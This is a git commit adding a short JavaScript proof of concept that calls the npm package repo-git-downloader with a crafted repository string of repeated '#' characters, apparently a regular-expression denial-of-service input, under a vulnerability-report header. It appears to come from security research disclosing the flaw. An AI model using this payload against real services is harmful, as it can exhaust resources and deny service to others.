10bd313ea39bbcf9e1e86bfa170f2911dd64db3c
Yeting Li <liyt@ios.ac.cn>
2021-09-06 16:55:55 +0800

    repo-git-downloader

---
+++ js/repo-git-downloader.js
@@ -0,0 +1,15 @@
+/**
+ * repo-git-downloader@0.1.1
+ * Package Manager: npm
+ * Link to published package: https://github.com/mnichangxin/repo-git-downloader
+ * Link to GitHub repo: https://github.com/mnichangxin/repo-git-downloader
+ * Severity level: High
+ * Module Description: A tool to download git repository
+ * Additional Info: It allows cause a denial of service when downloading crafted invalid git repositories.
+ * Contacted maintainer?: No
+ * Open issue?: No
+ */
+
+
+var download = require("repo-git-downloader")
+download('git@github.com:--/--#################################################################################################################################################################!')
